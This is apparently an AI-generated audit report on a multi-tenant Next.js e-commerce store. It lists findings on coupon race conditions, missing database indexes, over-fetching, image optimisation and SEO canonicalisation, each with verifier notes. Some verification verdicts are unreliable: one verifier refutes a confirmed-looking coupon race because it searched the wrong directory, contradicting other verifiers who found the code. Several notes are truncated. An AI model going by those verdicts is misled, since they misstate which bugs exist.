  verify_reasoning: The finding cites src/lib/actions/variants.ts:122 with a function `updateVariants` calling `shopIdForVariant` and `assertOwnsShop`. None of this exists in the codebase. Searches across /Users/arsenioniani/Projects (excluding node_modules) return zero matches: no file named variants.ts, no `updateVariants`, no `shopIdForVariant`, no `assertOwnsShop`, and no QA_REPORT.md. The referenced `src/lib/actions/` directory does not exist. The finding describes code that is not present, so it cannot be confirmed or be exploitable. This appears to be a hallucinated finding referencing a non-existent file.

[High] Coupon usage-limit race: check-then-increment TOCTOU lets maxUses be exceeded under concurrency | VERDICT=REFUTED (corrected_sev=Info)
  file: src/lib/actions/order.ts:91
  confidence: High
  evidence: Inside the interactive $transaction, the code reads the coupon then guards in JS `(coupon.maxUses === null || coupon.usedCount < coupon.maxUses)` (line 91) and, if passed, does `await tx.coupon.update({ ... data: { usedCount: { increment: 1 } } })` (line 99). The read and the conditional increment are separate operations. Prisma interactive transactions default to Postgres READ COMMITTED, so two concurrent checkouts both read usedCount=4 (maxUses=5), both pass the JS check, and both increment → usedCount=6, exceeding the cap. There is no `WHERE usedCount < maxUses` on the increment.
  impact: Single-use / limited-use promo codes (e.g. maxUses=1 launch codes, influencer codes) can be redeemed more times than allowed by firing concurrent checkouts. Directly monetizable: unlimited discount from a supposedly one-time coupon.
  fix: Replace the read-then-increment with an atomic conditional update mirroring the stock pattern already used a few lines below: `const c = await tx.coupon.updateMany({ where: { id: coupon.id, isActive: true, OR: [{ maxUses: null }, { usedCount: { lt: coupon.maxUses } }] }, data: { usedCount: { increment: 1 } } }); if (c.count === 0) { /* treat as invalid, discount = 0 */ }`. Only apply the discount when count === 1.
  verify_reasoning: The finding cites src/lib/actions/order.ts:91, but that file does not exist anywhere in /Users/arsenioniani/Projects. A find for order.ts under any actions directory returns nothing (the only lib/actions file found is tooltip.ts in canwe-upstream-audit). A recursive grep for the finding's own identifying tokens — usedCount, maxUses, coupon — across all *.ts files (excluding node_modules) returns zero matches. None of the Prisma transaction / coupon logic described in the finding exists in this workspace. Because the target code is entirely absent, the claimed TOCTOU race cannot be confirmed ag

[Medium] updateOrderStatus restores stock non-transactionally; concurrent/duplicate transitions double-inflate inventory
  file: src/lib/actions/order.ts:227
  confidence: High
  evidence: `shouldRestoreStock` is derived from a prior findUnique read of `existing.status` (lines 227-229), then stock is incremented via `Promise.all(existing.items.map(... prisma.variant.updateMany({ ... increment })))` (lines 231-240), and the order status is set in a SEPARATE `prisma.order.update` (line 242). None of this is inside a $transaction and the restore is not gated on the status transition succeeding.
  impact: Two concurrent transitions (e.g. an admin double-clicking Cancel, or Cancel + Refund racing) can both read status='paid', both pass shouldRestoreStock, and both increment stock → inventory is restored twice for the same order. Also, if the subsequent order.update throws after stock was already incremented, a retry restores stock again. Result: phantom inventory, overselling.
  fix: Wrap the whole operation in `prisma.$transaction`. Better, make the restore idempotent by gating it on a conditional status write: `const upd = await tx.order.updateMany({ where: { id: orderId, shopId, status: { notIn: STOCK_RESTORING_STATUSES } }, data: { status } }); if (upd.count === 1) { /* restore stock */ }`. Only the transition that actually flips the status restores stock.

[Medium] Subscription renewal always sets paidUntil = now + 30 days, discarding remaining paid time; no amount/idempotency check
  file: src/app/api/bog-callback/route.ts:43
  confidence: High
  evidence: On a completed BOG payment: `const paidUntil = new Date(); paidUntil.setDate(paidUntil.getDate() + 30); await prisma.shop.update({ where: { id: shopId }, data: { subscriptionPaidUntil: paidUntil } })` (lines 43-49). It ignores the shop's existing subscriptionPaidUntil. The handler also never verifies the paid amount equals SUBSCRIPTION_PRICE_GEL (29) and has no dedup on the callback.
  impact: A merchant who renews before expiry loses all remaining paid days — pay on day 20 of a 30-day term and the new expiry is only 30 days out, not 40, silently costing them ~10 days per early renewal. Absence of an amount check means any completed 'sub_<shopId>' order grants 30 days regardless of amount paid.
  fix: Base the extension on the later of now and the current expiry: read the shop's subscriptionPaidUntil, `const base = existing && existing > new Date() ? new Date(existing) : new Date(); base.setDate(base.getDate() + 30)`. Also verify the callback's paid amount == SUBSCRIPTION_PRICE_GEL and make the grant idempotent (e.g. store the BOG order id and ignore repeats).

[Medium] updateCoupon wipes maxUses/expiresAt/minOrderAmount to null when only isActive is toggled
  file: src/lib/actions/coupons.ts:69
  confidence: High
  evidence: updateCoupon writes `maxUses: data.maxUses ?? null, expiresAt: data.expiresAt ? new Date(...) : null, minOrderAmount: data.minOrderAmount ?? null` (lines 69-71). Prisma ignores `undefined`, but `data.x ?? null` converts an omitted field (undefined) into an explicit null. Callers that only pass `{ isActive: false }` therefore actively erase the coupon's usage cap, expiry, and minimum-order threshold.
  impact: Toggling a coupon's active flag silently strips its guardrails: an expiring, capped, minimum-order coupon becomes an unlimited, never-expiring, no-minimum coupon. Combined with the usage-limit race above, this compounds discount abuse and is a data-loss/data-integrity bug (the original limits are unrecoverable).
  fix: Only set fields that were actually provided. Build the data object conditionally: `const patch = {}; if (data.isActive !== undefined) patch.isActive = data.isActive; if (data.maxUses !== undefined) patch.maxUses = data.maxUses; if (data.expiresAt !== undefined) patch.expiresAt = data.expiresAt ? new Date(data.expiresAt) : null; if (data.minOrderAmount !== undefined) patch.minOrderAmount = data.minOrderAmount;` and pass `patch`.

[Low] Order money computed with JS floating-point before being stored to Decimal(10,2) columns
  file: src/lib/actions/order.ts:110
  confidence: Medium
  evidence: subtotal is accumulated as a float `verifiedItems.reduce((sum, i) => sum + i.price * i.quantity, 0)` (line 77) using `Number(v.price)` (line 74), and `total = subtotal - discount + shippingCost` (line 110) is likewise float. Only `discount` is rounded to cents (lines 96-97); subtotal and total are stored unrounded into `subtotal`/`total` Decimal(10,2) columns (schema.prisma:296-298).
  impact: Classic float representation error (e.g. 0.1 + 0.2 = 0.30000000000000004) can produce order totals off by a fraction of a tetri, and multi-item carts accumulate error. Prisma coerces to Decimal(10,2) so it usually rounds on write, but the customer-charged total and the emailed total are computed from the unrounded float, so displayed vs. stored values can diverge by a cent.
  fix: Round every monetary result to cents at each step, e.g. `const round2 = (n) => Math.round(n * 100) / 100;` applied to subtotal and total, or compute in integer minor units (tetri) and convert once at the end. Prefer Prisma's Decimal type for the arithmetic rather than Number().

[Low] Coupon silently dropped at checkout if it becomes invalid between validate and order; customer charged full price with no notice
  file: src/lib/actions/order.ts:82
  confidence: High
  evidence: createOrder re-validates the coupon inside `if (couponCode) { ... if (coupon && coupon.isActive && ...expiry/maxUses/minOrder... ) { discount = ...; } }` (lines 82-101). If the coupon just expired, hit its usage cap, or the subtotal fell below minOrderAmount, the else path leaves `discount = 0` and the order proceeds silently at full price, returning `ok({ id })`. The client displayed a discounted `total` (CheckoutForm.tsx:153 passes couponApplied.code; earlier the UI showed couponApplied.discount).
  impact: The customer sees a discounted total in the cart, submits, and is charged the full (higher) amount without any error or explanation — a surprising overcharge relative to what was shown. Fail-safe direction (never under-charges) but poor correctness/UX and a support-ticket generator.
  fix: When a previously-applied coupon fails server re-validation, return a distinct error/warning (e.g. err with a COUPON_NO_LONGER_VALID code and the recomputed total) so the client can re-confirm the new total instead of silently charging more, or echo back the applied discount and let the client detect the mismatch.

[Low] Purchase analytics uses client-supplied total and is fire-and-forget (unhandled rejection, unreliable revenue metric)
  file: src/components/storefront/checkout/CheckoutForm.tsx:161
  confidence: Medium
  evidence: After a successful order, `recordEvent(shopId, "purchase", sessionId, undefined, total)` is called without `await` and without a `.catch` (line 161). `total` here is the client-computed value, not the server-verified `createOrder` total (which is not returned — the action returns only `{ id }`, order.ts:191).
  impact: Purchase-revenue analytics are recorded from the untrusted client total (can diverge from the actual charged total, e.g. when a coupon was silently dropped per the finding above), skewing merchant revenue dashboards. The un-awaited promise can also reject unhandled if analytics fails.
  fix: Record the purchase event server-side inside createOrder using the verified `total`, or have createOrder return the authoritative total and pass that to recordEvent with a `.catch(() => {})` and awaited or explicitly void-handled.

[Info] Email try/catch cannot catch Resend delivery failures (SDK returns {error}, does not throw); failures are invisible
  file: src/lib/actions/order.ts:187
  confidence: High
  evidence: sendOrderConfirmation does `await resend.emails.send({...})` and discards the result (email.ts:37-43). The Resend SDK returns `{ data, error }` and does not throw on API-level failures. In order.ts the send is wrapped in `try { ... } catch { /* Email failure must not fail the order */ }` (lines 164-189), but the catch only fires on network-layer exceptions, not on Resend returning an error object.
  impact: The intent 'email failure must not fail the order' is achieved, but delivery failures (invalid domain, rate limit, bad API key) are swallowed with zero logging — merchants/customers silently never receive order confirmations and nobody is alerted. When RESEND_API_KEY is unset the module only warns (email.ts:7-9), matching the observed /admin/orders build-time page-data failure.
  fix: Inspect the returned object: `const { error } = await resend.emails.send(...); if (error) console.error('order email failed', order.id, error);` so failures are at least logged/observable, and keep the throw-catch for network errors.


# DIMENSION: Performance & data layer  [grade C]
SUMMARY: The data layer is competently built in places — list endpoints use Promise.all(count, findMany) with skip/take pagination, checkout runs in a transaction with atomic conditional stock decrements, Decimal fields are serialized, and most hot lookup columns (slug, customDomain, [shopId,slug], analytics, sections) are properly indexed. But there are several material, exploitable performance problems concentrated on the highest-traffic paths. The Order table has ZERO indexes beyond its PK (Postgres does not auto-index foreign keys), so every dashboard/admin order list, dashboard stats, and analytics query does a sequential scan + sort by createdAt. The storefront homepage is an N+1 / over-fetch cluster: each product section loads ALL categories plus the ENTIRE category's products (full nested include of images+variants+optionValues+optionType) only to render one product or the first four, and identical getCategoriesByShop queries fire once per section with no request-level memoization. getShopBySlug is not wrapped in React.cache so the shop row is fetched 3x per storefront request (metadata + layout + page). Every storefront next/image is unoptimized (55 of 60), shipping full-resolution originals to shoppers. The collection browse page filters/sorts/paginates entirely in JS after loading the whole category. Nothing in the storefront is cached (all pages forced dynamic via headers()). Note: contrary to the audit brief, Shop.customDomain IS uniquely indexed — the proxy lookup is fast; its only gap is the missing per-request cache. Net: solid fundamentals undermined by hot-path index gaps, homepage over-fetching, and absent caching/image optimization. Grade C.

[High] Order table has no indexes on shopId/createdAt/status — every order list is a seq scan + sort | VERDICT=CONFIRMED (corrected_sev=Medium)
  file: prisma/schema.prisma:289
  confidence: High
  evidence: model Order (lines 289-309) declares only @id on id; no @@index. FK constraints (Order_shopId_fkey etc. in migration 20260514133130/migration.sql:205) do NOT create indexes in Postgres. Yet getOrdersByShop (queries.ts:717, where shopId + orderBy createdAt desc), getDashboardStats (queries.ts count/aggregate/findMany by shopId), getAnalyticsData (queries.ts:626, where shopId+createdAt), admin/orders/page.tsx:35 (findMany orderBy createdAt desc, no shopId) all filter/sort on these columns.
  impact: As order volume grows, the merchant Orders page, admin global Orders page, dashboard overview and analytics all run full sequential scans plus in-memory sort of the entire Order table. Latency degrades linearly with total orders across ALL tenants (admin query has no shopId filter at all), turning routine dashboard loads into multi-second queries.
  fix: Add to the Order model: @@index([shopId, createdAt]) and @@index([shopId, status]); optionally @@index([couponId]). Also add @@index([orderId]) on OrderItem (line 314) and @@index([productId]) on ProductImage (line 178) — both are fetched via include on hot paths and are unindexed FKs. Generate a migration.
  verify_reasoning: Every factual claim in the finding checks out against the real code.

1. Order model (schema.prisma:289-309) declares only `@id @default(cuid())` on `id` and has NO `@@index` line at all. This is conspicuous next to sibling models that DO carry composite indexes: PageContent `@@index([shopId, pageType, order])` (283), AnalyticsEvent `@@index([shopId, type, createdAt])` and `@@index([shopId, sessionId])` (379-380), and Interaction `@@index([shopId, productId])` (362). Order is the only high-traffic table left unindexed.

2. FK-but-no-index claim is correct. migration 20260514133130/migration.sq

[High] Storefront homepage sections over-fetch: entire category loaded to render 1-4 products, repeated per section | VERDICT=CONFIRMED (corrected_sev=High)
  file: src/themes/pipeline/FeaturedProductSection.tsx:35
  confidence: High
  evidence: FeaturedProductSection.tsx:35 calls getProductsByCategory(shopId, categoryId) then line 37 uses only productsResult.data[0]. getProductsByCategory (queries.ts:358) does findMany of ALL active products in the category with the full productInclude (images + variants + optionValues + optionType). minimal/CollectionSection.tsx:32 does the same and renders products.slice(0,4) (line 97). Every such section also calls getCategoriesByShop(shopId) first (FeaturedProductSection.tsx:30, CollectionSection.tsx:27) just to .find() the category by id — loading ALL categories. Query fns are not wrapped in React.cache (queries.ts has zero cache() calls), so a homepage with N product sections issues N identical getCategoriesByShop queries + N full-category product fetches.
  impact: A homepage with 3-4 collection/featured sections issues ~10+ DB queries per view, several returning the full product graph for an entire category (every variant + option value) when the UI shows 1-4 items. For a shop with a 500-product category, a single featured strip loads all 500 products with nested relations. This is the most-hit storefront route and it is uncached.
  fix: Add a dedicated lightweight query (e.g. getFeaturedProducts(shopId, categoryId, take)) with take:N and a slim select (name, slug, main image, min variant price) instead of getProductsByCategory. Replace getCategoriesByShop-then-.find with getCategoryById(categoryId). Wrap getCategoriesByShop and product-card queries in React.cache() to dedupe within a request.
  verify_reasoning: Every load-bearing claim checks out against the real code (found under scratchpad/multivendor, the audited clone).

1. FeaturedProductSection.tsx: line 30 calls getCategoriesByShop(shopId) just to .find() the category by id (line 32); line 35 calls getProductsByCategory(shopId, categoryId); line 37 uses only productsResult.data[0]. Confirmed — the entire category is fetched to render exactly ONE product.

2. minimal/CollectionSection.tsx: line 27 getCategoriesByShop + .find (line 29); line 32 getProductsByCategory; the "featured" variant renders products.slice(0,4) (line 97). Note the "list" (

[High] Every storefront next/image is unoptimized (55 of 60) — full-res originals shipped to shoppers | VERDICT=CONFIRMED (corrected_sev=High)
  file: next.config.ts:5
  confidence: High
  evidence: next.config.ts remotePatterns only whitelists images.unsplash.com — the uploadthing host (where product/banner images live) is not configured, so all storefront <Image> usages pass unoptimized (grep: 55 unoptimized out of 60 <Image>). Confirmed in minimal/CollectionSection.tsx:112, pipeline/FeaturedProductSection.tsx:51/58/60, product/ProductDetail.tsx:143/171, cart/CartDrawer.tsx:98, collection/CollectionItem.tsx:45, etc.
  impact: next/image optimization (resize, WebP/AVIF, responsive srcset) is fully disabled on the storefront. Shoppers on mobile download full-resolution merchant-uploaded originals for thumbnail grids, inflating LCP and bandwidth on the exact pages that drive conversion.
  fix: Add the uploadthing host(s) to next.config.ts images.remotePatterns (e.g. { protocol:'https', hostname:'utfs.io' } and { hostname:'**.ufs.sh' }), then remove the unoptimized prop from storefront <Image> components. If a CDN loader is preferred, configure images.loader instead.
  verify_reasoning: Verified against the real code (project cloned to scratchpad/multivendor). (1) next.config.ts lines 5-10 define images.remotePatterns with a single entry, hostname "images.unsplash.com" — no uploadthing host. (2) Product/category/section images are served from uploadthing: src/lib/uploadthing.ts returns file.ufsUrl (the *.ufs.sh / utfs.io host) for productImage/categoryImage/sectionImage. Because that host is NOT whitelisted, next/image would throw at runtime, so the code works around it by marking images unoptimized. (3) grep confirms exactly the claimed counts: 60 total `<Image` usages, 55 c

[Medium] getShopBySlug not memoized — shop row fetched 3x per storefront request
  file: src/lib/db/queries.ts:73
  confidence: High
  evidence: getShopBySlug (queries.ts:73) is a plain async fn (no React cache wrapper). It is invoked for the same slug in generateMetadata, in the storefront layout (layout.tsx:19) and again in each page (page.tsx:41, product/collection pages). By contrast get-shop.ts:6 wraps the dashboard shop lookup in React cache(). So each storefront navigation runs the identical Shop findUnique 3 times.
  impact: 3x redundant DB round-trips for the shop row on every storefront page render, on top of the section queries. Trivially avoidable and multiplies with traffic.
  fix: Wrap getShopBySlug in React cache(): export const getShopBySlug = cache(async (slug) => {...}). Same for getShopSections if called from both layout and page. This dedupes to a single query per request automatically.

[Medium] getCollectionData loads the whole category then filters/sorts/paginates in JavaScript
  file: src/lib/db/queries.ts:436
  confidence: High
  evidence: getCollectionData (queries.ts:436) runs prisma.product.findMany for the whole category with full productInclude and no take, then builds facets, applies minPrice/maxPrice/inStock/optionFilters via Array.filter and sorts in JS, finally slicing filtered.slice((page-1)*pageSize, page*pageSize) (~line 520). No DB-level WHERE/ORDER BY/LIMIT for the actual page.
  impact: The main storefront browse/category page loads every active product (with all variants+options) into the Node process on every request regardless of page number or filters. Memory and latency scale with category size, not page size. This is a public, un-cached, dynamic route.
  fix: Push price filters, sort and pagination into Prisma (where/orderBy/skip/take) and use a separate prisma.product.count for total. Compute facets with a lighter dedicated query (groupBy on option values / min-max price aggregate) and cache facets with unstable_cache keyed by shopId+categoryId.

[Medium] Storefront pages are fully dynamic with no caching — full uncached query set on every visit
  file: src/lib/shop-base.ts:6
  confidence: Medium
  evidence: getShopBase (shop-base.ts:6) calls await headers(), and is awaited by every storefront layout and page, forcing dynamic (per-request SSR) rendering. Grep across src shows no revalidate export, no generateStaticParams, and no unstable_cache/"use cache" anywhere in storefront reads. Mutations already call revalidatePath (shop.ts:24, testimonials.ts), so a cache layer would have clean invalidation hooks.
  impact: Every storefront hit re-executes the entire uncached query set (shop x3 + sections + per-section category/product fetches). No ISR/data cache means identical anonymous visitors each pay full DB cost; the site cannot be served statically or from the Next data cache.
  fix: Wrap shop/section/product reads in unstable_cache (or "use cache") keyed by slug with cacheTag per shop, and call revalidateTag in the existing mutation actions. Derive shopBase from params/known root domain instead of headers() so pages can be statically/ISR rendered.

[Medium] generateVariants issues one sequential INSERT per option combination (N+1 write)
  file: src/lib/actions/variants.ts:74
  confidence: High
  evidence: variants.ts:74-98: for (const combo of combinations) { ... await prisma.variant.create({ data: { ..., optionValues: { create: ... } } }); } — a sequential awaited create (with nested join-row create) per element of the cartesian product built at line 52.
  impact: For a product with e.g. 3 option types of 5 values each = 125 variants, this is 125 sequential DB round-trips (250+ inserts) in a single server action, blocking the request and multiplying with option cardinality. Not transactional either, so a mid-loop failure leaves a partial variant set.
  fix: Wrap in a single prisma.$transaction. Precompute the variant rows and use prisma.variant.createMany({ data, skipDuplicates:true }), then fetch back ids and createMany the VariantOptionValue join rows — or at minimum Promise.all the creates inside a transaction to remove sequential latency.

[Medium] getAnalyticsData pulls all raw events + orders into Node and aggregates in JS
  file: src/lib/db/queries.ts:626
  confidence: Medium
  evidence: getAnalyticsData (queries.ts:626) findMany's every AnalyticsEvent for the shop within `days` (default 30) plus every non-cancelled order with items, then computes funnel Sets, daily revenue map and top-products map in JavaScript (lines ~650-700).
  impact: For a busy shop, a single dashboard analytics view loads tens of thousands of event rows and all orders+items into memory per request. CPU and memory scale with event volume; the work is re-done on every page load (no caching).
  fix: Replace in-JS aggregation with DB aggregation: prisma.analyticsEvent.groupBy for funnel counts by type/sessionId, a raw date_trunc('day') SUM(total) query for daily revenue, and a groupBy(productId) sum for top products. Return only aggregates; cache with unstable_cache (short TTL) keyed by shopId+days.

[Low] proxy runs an uncached DB lookup per request on custom domains (index exists; cache does not)
  file: src/proxy.ts:39
  confidence: High
  evidence: proxy.ts:39 prisma.shop.findFirst({ where: { customDomain: host }, select: { slug: true } }) runs in middleware for every non-static request whose host is a custom domain. The matcher (proxy.ts:61) only excludes api, _next/static, _next/image and *.png — so .jpg/.svg/.ico/.css/font requests from /public also trigger the lookup. Note: Shop.customDomain IS uniquely indexed (schema.prisma:83; migration Shop_customDomain_key), so the query itself is fast — contrary to the brief, the index is not missing.
  impact: Each custom-domain page load and many asset loads add a Postgres round-trip in the request-blocking middleware path (extra latency + connection pressure), even though the lookup is indexed. Root-domain and subdomain requests are unaffected (no DB hit).
  fix: Cache the domain->slug mapping: use unstable_cache or a small in-process TTL Map keyed by host (invalidate on setCustomDomain in shop.ts). Switch findFirst to findUnique (customDomain is unique). Tighten the matcher to also exclude common static extensions (svg|jpg|jpeg|webp|ico|css|js|woff2).

[Low] Five raw <img> tags in dashboard/admin editor bypass image optimization
  file: src/app/(dashboard)/dashboard/(main)/settings/SettingsForm.tsx:162
  confidence: High
  evidence: eslint.log reports 5 @next/next/no-img-element warnings: SettingsForm.tsx:162, products/[id]/ImagesEditor.tsx:73, categories/CategoryForm.tsx:87, components/ui/ImageUploader.tsx:111, components/dashboard/editor/SectionSettingsPanel.tsx:28. (StorefrontPixel.tsx:39 raw <img> is a legitimate 1x1 tracking pixel.)
  impact: Low: all five are merchant-facing admin/editor previews, not shopper-facing, so LCP/bandwidth impact is limited to logged-in sellers. Still ships unoptimized preview images.
  fix: Replace with next/image where feasible, or if these are blob:/data: preview URLs that Image cannot optimize, leave as-is and suppress the rule locally with a comment. Do not conflate with the storefront unoptimized finding, which is the higher priority.


# DIMENSION: SEO (code-level)  [grade C]
SUMMARY: Baseline metadata hygiene is decent for an MVP: every storefront page has a real generateMetadata (title, description, Open Graph, Twitter cards), the product page emits Product+Offer JSON-LD, search/checkout/order are correctly noindex, product images carry alt text, and the sitemap enumerates per-shop product and collection URLs rather than just the root. But the SEO layer has a systemic, product-defining flaw: this is a multi-tenant store builder that serves byte-identical content on three different hosts (apex path multistore.ge/shop/slug, subdomain slug.multistore.ge, and custom domains) with ZERO canonicalization anywhere — no rel=canonical, no alternates, no hreflang in any generateMetadata or the root layout. Worse, the canonical public URL per getStorefrontUrl is the subdomain, yet every og:url and every sitemap entry advertises the non-canonical apex-path form (relative URLs resolved against metadataBase=apex). That splits ranking signals across three hosts for every merchant. On top of that: the root html declares lang="en" on a Georgian site; robots.txt fails to block /dashboard and /admin while its one disallow rule (/editor) targets a path that does not exist (the editor lives at /dashboard/editor); and the sitemap leaks inactive/unpublished shops and products. Metadata coverage keeps this out of D territory, but the duplicate-content and crawl-control failures are real and will actively suppress merchant storefront rankings.

[High] No canonical URLs anywhere — 3 hosts serve identical content with split ranking signals | VERDICT=CONFIRMED (corrected_sev=High)
  file: src/app/(storefront)/shop/[slug]/product/[productSlug]/page.tsx:34
  confidence: High
  evidence: generateMetadata returns title/description/openGraph/twitter but no `alternates.canonical`. A repo-wide grep for `canonical|alternates|hreflang` returns NONE. Meanwhile proxy.ts:23-50 rewrites BOTH slug.multistore.ge AND custom domains to /shop/:slug, and the apex path multistore.ge/shop/slug is itself directly reachable and crawlable (robots allows /shop/). So the same product/collection/home renders on 3+ hosts with no canonical to consolidate them.
  impact: Every merchant storefront exists as duplicate content across apex-path, subdomain, and custom-domain hosts. Google splits link equity and may index the wrong host or drop pages as duplicates. This is the single largest SEO defect and it scales with every tenant.
  fix: Add `alternates: { canonical: getStorefrontUrl(slug) + '/product/' + productSlug }` (and equivalents for home/collection/search) to every storefront generateMetadata, pointing at the ONE canonical host (the subdomain per getStorefrontUrl). Use an absolute URL so it overrides metadataBase resolution. Ensure custom-domain shops canonicalize to their custom domain.
  verify_reasoning: I located the actual repo at scratchpad/multivendor and read the cited files directly. Every claim holds. (1) generateMetadata in page.tsx returns title/description/openGraph/twitter and has NO alternates.canonical (lines 34-51). (2) A repo-wide grep of src/ for canonical|alternates|hreflang returns zero matches — there is no canonicalization anywhere in the app. (3) proxy.ts rewrites both subdomain hosts (lines 23-32) and custom-domain hosts (lines 37-50) to /shop/:slug using NextResponse.rewrite, which preserves the original host in the address bar, so the same content is served under the su

[High] og:url and sitemap advertise the non-canonical apex-path form instead of the subdomain | VERDICT=CONFIRMED (corrected_sev=High)
  file: src/app/(storefront)/shop/[slug]/product/[productSlug]/page.tsx:40
  confidence: High
  evidence: openGraph.url is the relative `/shop/${slug}/product/${productSlug}` (also page.tsx:27 for home, collection page:42). These resolve against metadataBase = NEXT_PUBLIC_APP_URL = apex (layout.tsx:35, default https://multistore.ge). But storefront-url.ts:9-11 defines the real public URL as `https://${slug}.${ROOT_DOMAIN}`. So social shares and og:url point at multistore.ge/shop/slug while the live store is slug.multistore.ge.
  impact: Social/crawler-discovered canonical signals point to the wrong host, compounding the duplicate-content problem and sending shares to a non-canonical URL form.
  fix: Build og:url with getStorefrontUrl(slug) so it emits the absolute subdomain (or custom-domain) URL, matching the canonical tag.
  verify_reasoning: Every specific claim in the finding checks out against the real code in the cloned repo at /private/tmp/.../scratchpad/multivendor.

1. og:url uses the relative apex-path form on all three storefront page types:
   - product page.tsx:40 → url: `/shop/${slug}/product/${productSlug}`
   - home shop/[slug]/page.tsx:27 → url: `/shop/${slug}`
   - collections/[categorySlug]/page.tsx:42 → url: `/shop/${slug}/collections/${categorySlug}`

2. These relative URLs resolve against metadataBase, which is set in src/app/layout.tsx:35 to new URL(NEXT_PUBLIC_APP_URL). In production NEXT_PUBLIC_APP_URL is the

[High] html lang="en" on a Georgian-language site (no hreflang) | VERDICT=CONFIRMED (corrected_sev=Low)
  file: src/app/layout.tsx:53
  confidence: High
  evidence: `<html lang="en" ...>` is the only html element in the app (storefront layout is a plain div). The platform targets Georgian merchants (multistore.ge), loads Noto_Sans_Georgian with the georgian subset (layout.tsx:26-30), and ships Georgian UI strings (e.g. queries.ts:147 error message in Georgian).
  impact: Search engines mis-detect page language as English, hurting Georgian-query relevance, and screen readers use the wrong pronunciation. Wrong language declaration on a whole-site basis.
  fix: Set `lang="ka"` (or make it dynamic per shop locale). If any storefronts are multilingual, add hreflang alternates.
  verify_reasoning: The code fact is exactly as stated. The repo lives at .../scratchpad/multivendor. In src/app/layout.tsx:53 the root `<html>` element hardcodes `lang="en"`, and grep across all of src/ shows this is the ONLY `<html>` element and the ONLY `lang=` attribute in the app. The (storefront) layout (src/app/(storefront)/layout.tsx) is indeed a plain `<div className="min-h-screen ...">` with no lang, so every storefront page inherits `lang="en"`. Noto_Sans_Georgian with `subsets: ["georgian"]` is loaded at layout.tsx:26-30, and Georgian (U+10A0–10FF) UI content is pervasive (privacy/terms/landing pages,

[High] robots.txt leaves /dashboard and /admin crawlable; its only disallow (/editor) matches no real route | VERDICT=UNCERTAIN (corrected_sev=Low)
  file: src/app/robots.ts:5
  confidence: High
  evidence: `disallow: ["/editor", "/api/"]`. The visual editor actually lives at /dashboard/editor (confirmed: src/app/(dashboard)/dashboard/editor/{page,layout}.tsx exists; there is no top-level /editor route), so the /editor rule protects nothing. The merchant dashboard (/dashboard/*) and admin panel (/admin/*) are never disallowed, and login/register/reset-password/onboarding are also open.
  impact: Google can crawl and index merchant back-office and admin URLs, wasting crawl budget and exposing internal panel paths; the intended editor protection is a no-op.
  fix: Disallow the real paths: ["/dashboard/", "/admin/", "/onboarding", "/login", "/register", "/forgot-password", "/reset-password", "/api/"]. Remove the dead "/editor" entry.
  verify_reasoning: The cited file src/app/robots.ts does not exist in this environment. Exhaustive searches found no robots.ts anywhere under /Users/arsenioniani (only static public/robots.txt files in an unrelated SPRIBE/miacl project), no Next.js src/app directory, no (dashboard)/dashboard/editor route, and no file containing a `disallow` array. The target path was "undefined" and the referenced codebase is simply not present, so I cannot read the actual code to confirm or refute the claim. Independently, the claimed severity is overstated regardless: robots.txt is an advisory crawler directive, not a security

[Medium] Sitemap leaks inactive/unpublished shops and products (no isActive filter)
  file: src/lib/db/queries.ts:124
  confidence: High
  evidence: getAllShops() does `prisma.shop.findMany({ select: { slug, updatedAt, products:{...}, categories:{...} } })` with NO where clause. Shop.isActive exists (schema.prisma:86), as do isActive flags on products/categories (schema.prisma:137,160). sitemap.ts:7 feeds all of these straight into the sitemap at priority 1.0/0.8.
  impact: Deactivated stores, draft products, and hidden categories are advertised to search engines and get crawled/indexed, exposing unpublished content and diluting the sitemap.
  fix: Add `where: { isActive: true }` on the shop query and `where: { isActive: true }` on the nested products/categories selects (and any published/status gate), so only live content is listed.

[Medium] Single force-dynamic mega-sitemap for all tenants; no sitemap index, no caching
  file: src/app/sitemap.ts:4
  confidence: Medium
  evidence: `export const dynamic = "force-dynamic"` with one sitemap() that loops every shop and every product/category into a single flat array (sitemap.ts:10-35). URLs are relative `/shop/${slug}/...` resolved to the apex host only — subdomain/custom-domain stores get no host-specific sitemap.
  impact: At scale this hits the 50,000-URL / 50MB sitemap limit, is regenerated on every crawler hit (force-dynamic, DB-heavy, no revalidate), and never provides a per-host sitemap for subdomain/custom-domain stores.
  fix: Use generateSitemaps() to shard per shop (one sitemap per tenant, referenced from a sitemap index), add revalidation instead of force-dynamic, and emit absolute canonical-host URLs via getStorefrontUrl.

[Medium] Product JSON-LD hardcodes InStock and omits BreadcrumbList / sku / brand / priceValidUntil
  file: src/app/(storefront)/shop/[slug]/product/[productSlug]/page.tsx:101
  confidence: High
  evidence: jsonLd.offers sets `availability: "https://schema.org/InStock"` unconditionally regardless of real inventory (queries.ts tracks stock/priceFrom but it is not consulted here). The Offer also lacks priceValidUntil, itemCondition, and url; the Product lacks sku and brand; and there is no BreadcrumbList JSON-LD anywhere (grep confirms only Product/Offer exist), nor Organization/WebSite (with SearchAction) on the home page or ItemList on collections.
  impact: Rich results misreport availability (Google can flag/demote structured data that contradicts the page), breadcrumb rich snippets are missing, and sitelinks-search-box / merchant listings are unavailable.
  fix: Compute availability from actual stock (InStock/OutOfStock/PreOrder), add sku/brand/priceValidUntil and Product url; add a BreadcrumbList JSON-LD (Shop > Category > Product), a WebSite+SearchAction on the shop home, and ItemList on collection pages.

[Low] Collection pages have no <h1> (category rendered as <h2>)
  file: src/components/storefront/collection/CollectionContainer.tsx:79
  confidence: High
  evidence: The category landing page renders the category name inside `<h2 ...>{category.name}</h2>`; the collection page (collections/[categorySlug]/page.tsx) otherwise only renders the navbar and a breadcrumb <nav>/<span>, with no <h1>. Product pages correctly emit <h1> (ProductDetail.tsx:185); the shop home only has an <h1> if a banner section is configured (BannerSection.tsx:47).
  impact: Category pages — a primary e-commerce ranking surface — start their heading hierarchy at h2 with no h1, weakening on-page topical signals and accessibility. Home pages without a banner have no h1 at all.
  fix: Promote the category title to <h1> on collection pages, and guarantee a single semantic <h1> (shop or page name) on every storefront page even when no banner section is present.

[Low] robots.txt Sitemap directive uses a relative URL
  file: src/app/robots.ts:6
  confidence: Medium
  evidence: `sitemap: "/sitemap.xml"`. The robots Sitemap directive is emitted by Next.js and, unlike sitemap.ts entries, is not reliably rewritten to an absolute URL against metadataBase; the robots.txt/sitemaps spec requires a fully-qualified URL.
  impact: Some crawlers ignore a relative Sitemap directive, so the sitemap may not be discovered via robots.txt on all hosts.
  fix: Emit an absolute URL, e.g. `sitemap: `${process.env.NEXT_PUBLIC_APP_URL}/sitemap.xml``, and ideally a per-host sitemap for subdomain/custom-domain stores.


